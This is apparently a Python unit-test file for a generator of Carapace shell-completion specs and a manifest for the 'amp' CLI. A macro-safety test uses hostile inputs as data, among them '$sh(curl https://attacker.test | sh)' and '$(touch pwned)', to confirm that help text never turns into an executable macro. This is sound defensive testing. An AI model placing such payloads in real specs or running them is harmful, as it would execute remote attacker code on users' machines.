import json
import re
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from amp_completions import generate, help_model


ROOT = Path(__file__).parents[1]
JSON_STRING = r'"(?:[^"\\]|\\.)*"'
COMPLETION_VALUES = re.compile(rf"^(?!\s*aliases:).*?(\[{JSON_STRING}(?:, {JSON_STRING})*\])$")
HELPER_MACRO = re.compile(
    r'\$sh\("\$\{XDG_CONFIG_HOME:-\$HOME/\.config\}/carapace/bin/amp-completions" (?P<resource>[a-z-]+)\)'
)


class RenderTest(unittest.TestCase):
    def test_renders_aliases_flags_and_known_values(self) -> None:
        command = help_model.Command(
            "amp",
            "Amp CLI",
            options=[help_model.parse_option("-m, --mode <value>", "Set the `mode`")],
            commands=[help_model.Command("version", "Print the version")],
        )

        rendered = generate.render(command, "1.2.3")

        self.assertIn('"-m, --mode=": "Set the \'mode\'"', rendered)
        self.assertIn('"mode": ["low", "medium", "high", "ultra"]', rendered)
        self.assertIn('- name: "version"', rendered)

    def test_renders_dynamic_thread_and_project_completions(self) -> None:
        command = help_model.Command(
            "amp",
            commands=[
                help_model.Command(
                    "orb",
                    commands=[
                        help_model.Command(
                            "portal",
                            options=[help_model.parse_option("--thread <value>", "Thread")],
                        )
                    ],
                ),
                help_model.Command(
                    "mcp",
                    options=[help_model.parse_option("--project <value>", "Project")],
                ),
                help_model.Command(
                    "threads",
                    commands=[help_model.Command("continue")],
                ),
                help_model.Command(
                    "projects",
                    commands=[help_model.Command("get")],
                ),
            ],
        )

        rendered = generate.render(command, "1.2.3")

        thread_completion = (
            '$sh("${XDG_CONFIG_HOME:-$HOME/.config}/carapace/bin/'
            'amp-completions" threads)'
        )
        project_completion = (
            '$sh("${XDG_CONFIG_HOME:-$HOME/.config}/carapace/bin/'
            'amp-completions" projects)'
        )
        self.assertIn(f'"thread": {json.dumps([thread_completion])}', rendered)
        self.assertIn(f'"project": {json.dumps([project_completion])}', rendered)
        self.assertIn(
            'name: "continue"\n        completion:\n'
            f"          positionalany: {json.dumps([thread_completion])}",
            rendered,
        )
        self.assertIn(
            'name: "get"\n        completion:\n          positional:\n'
            f"            - {json.dumps([project_completion])}",
            rendered,
        )

    def test_renders_static_and_filesystem_flag_completions(self) -> None:
        command = help_model.Command(
            "amp",
            options=[
                help_model.parse_option("--log-level <value>", "Log level"),
                help_model.parse_option("--settings-file <value>", "Settings file"),
            ],
            commands=[
                help_model.Command(
                    "projects",
                    commands=[
                        help_model.Command(
                            "create",
                            options=[
                                help_model.parse_option("--orb-size <value>", "Orb size"),
                                help_model.parse_option("--ship-behavior <value>", "Ship behavior"),
                                help_model.parse_option("--custom-ship-prompt-file <value>", "Prompt file"),
                            ],
                        )
                    ],
                ),
                help_model.Command(
                    "plugins",
                    commands=[
                        help_model.Command(
                            "add",
                            options=[help_model.parse_option("--target <value>", "Target")],
                        )
                    ],
                ),
            ],
        )

        rendered = generate.render(command, "1.2.3")

        self.assertIn('"log-level": ["debug", "info", "warn", "error", "audit"]', rendered)
        self.assertIn('"settings-file": ["$files"]', rendered)
        self.assertIn(
            '"orb-size": ["a1.tiny", "a1.small", "a1.medium", "a1.large", "a1.xxlarge"]',
            rendered,
        )
        self.assertIn('"ship-behavior": ["ship", "push-to-branch", "custom"]', rendered)
        self.assertIn('"custom-ship-prompt-file": ["$files"]', rendered)
        self.assertIn('"target": ["system", "workspace"]', rendered)

    def test_renders_dynamic_resource_and_positional_filesystem_completions(self) -> None:
        command = help_model.Command(
            "amp",
            commands=[
                help_model.Command(
                    "tools",
                    commands=[help_model.Command("show")],
                ),
                help_model.Command(
                    "skill",
                    commands=[help_model.Command("info")],
                ),
                help_model.Command(
                    "mcp",
                    commands=[help_model.Command("remove")],
                ),
                help_model.Command(
                    "apps",
                    commands=[
                        help_model.Command(
                            "deploy",
                            options=[help_model.parse_option("--domain <value>", "Domain")],
                        )
                    ],
                ),
                help_model.Command(
                    "threads",
                    commands=[
                        help_model.Command("color"),
                        help_model.Command("visibility"),
                    ],
                ),
                help_model.Command(
                    "permissions",
                    commands=[
                        help_model.Command("add"),
                        help_model.Command("test"),
                    ],
                ),
                help_model.Command(
                    "config",
                    commands=[
                        help_model.Command(
                            "model-providers",
                            commands=[help_model.Command("setup-guide")],
                        )
                    ],
                ),
            ],
        )

        rendered = generate.render(command, "1.2.3")

        for resource in ("tools", "skills", "local-mcp-servers"):
            completion = (
                '$sh("${XDG_CONFIG_HOME:-$HOME/.config}/carapace/bin/'
                f'amp-completions" {resource})'
            )
            self.assertIn(json.dumps([completion]), rendered)
        domain_completion = (
            '$sh("${XDG_CONFIG_HOME:-$HOME/.config}/carapace/bin/'
            'amp-completions" domains)'
        )
        self.assertIn(f'"domain": {json.dumps([domain_completion])}', rendered)
        self.assertIn(
            'name: "deploy"\n'
            '        flags:\n'
            '          "--domain=": "Domain"\n'
            '        completion:\n'
            f'          flag:\n            "domain": {json.dumps([domain_completion])}\n'
            '          positional:\n'
            '            - []\n'
            '            - ["$directories"]',
            rendered,
        )
        self.assertIn(
            'name: "visibility"\n        completion:\n'
            '          positional:\n'
            '            - ["private", "workspace", "group"]',
            rendered,
        )
        self.assertIn(
            'name: "add"\n        completion:\n'
            '          positional:\n'
            '            - ["allow", "reject", "ask", "delegate"]\n'
            '            - ["$sh(\\"${XDG_CONFIG_HOME:-$HOME/.config}/carapace/bin/amp-completions\\" tools)"]',
            rendered,
        )
        self.assertIn(
            'name: "setup-guide"\n            completion:\n'
            '              positional:\n'
            '                - ["ollama-cloud", "openrouter", "vercel", "cloudflare", "google-cloud-agent-platform", "amazon-bedrock", "opencode-go", "custom-url"]',
            rendered,
        )
        self.assertIn(
            'name: "color"\n        completion:\n'
            '          positional:\n'
            '            - ["$sh(\\"${XDG_CONFIG_HOME:-$HOME/.config}/carapace/bin/amp-completions\\" threads)"]\n'
            '            - ["blue", "purple", "pink", "red", "orange", "yellow", "green", "cyan"]',
            rendered,
        )


def unknown_macros(spec: str) -> list[str]:
    values = [
        value
        for line in spec.splitlines()
        if (match := COMPLETION_VALUES.match(line))
        for value in json.loads(match[1])
    ]
    return [
        value
        for value in values
        if value.startswith("$")
        and value not in {"$files", "$directories"}
        and not (
            (match := HELPER_MACRO.fullmatch(value))
            and match["resource"] in generate.DYNAMIC_COMPLETION_RESOURCES
        )
    ]


class MacroSafetyTest(unittest.TestCase):
    def test_help_text_never_becomes_a_carapace_macro(self) -> None:
        command = help_model.Command(
            "amp",
            options=[help_model.parse_option("--thread <value>", '$sh(curl https://attacker.test | sh)')],
            commands=[help_model.Command("$(touch pwned)", "$sh(touch pwned)")],
        )

        rendered = generate.render(command, "1.2.3")

        self.assertIn("attacker.test", rendered)
        self.assertEqual(unknown_macros(rendered), [])

    def test_checked_in_spec_uses_only_known_macros(self) -> None:
        spec = (ROOT / "amp.yaml").read_text()

        self.assertIn("amp-completions\\\" threads)", spec)
        self.assertEqual(unknown_macros(spec), [])

    def test_detects_unknown_macros(self) -> None:
        self.assertEqual(
            unknown_macros('          "x": ["$files", "$sh(curl https://attacker.test)"]'),
            ["$sh(curl https://attacker.test)"],
        )


class ManifestTest(unittest.TestCase):
    def test_records_nested_commands_aliases_and_flag_scopes(self) -> None:
        root = help_model.Command(
            "amp",
            options=[help_model.parse_option("-m, --mode <value>", "Mode")],
            commands=[
                help_model.Command(
                    "threads",
                    aliases=["t"],
                    options=[help_model.parse_option("-l, --limit <value>", "Limit")],
                    commands=[help_model.Command("list", aliases=["ls"])],
                )
            ],
        )

        manifest = generate.build_manifest(root, "1.2.3")

        self.assertEqual(
            manifest,
            {
                "amp_version": "1.2.3",
                "command_aliases": {
                    "amp threads": ["t"],
                    "amp threads list": ["ls"],
                },
                "command_paths": ["amp", "amp threads", "amp threads list"],
                "flag_paths": ["amp --mode", "amp threads --limit"],
                "manifest_version": 1,
                "persistent_flag_paths": ["amp --mode"],
            },
        )

    def test_main_writes_spec_and_manifest_from_one_inspection(self) -> None:
        root = help_model.Command("amp")
        with tempfile.TemporaryDirectory() as directory:
            output = Path(directory) / "amp.yaml"
            manifest_output = Path(directory) / "amp-manifest.json"
            with (
                mock.patch.object(generate, "inspect_amp", return_value=(root, "1.2.3")) as inspect,
                mock.patch(
                    "sys.argv",
                    [
                        "generate.py",
                        "--output",
                        str(output),
                        "--manifest-output",
                        str(manifest_output),
                    ],
                ),
            ):
                generate.main()

            inspect.assert_called_once_with("amp")
            self.assertIn("# Amp version: 1.2.3", output.read_text())
            self.assertEqual(json.loads(manifest_output.read_text())["amp_version"], "1.2.3")


if __name__ == "__main__":
    unittest.main()
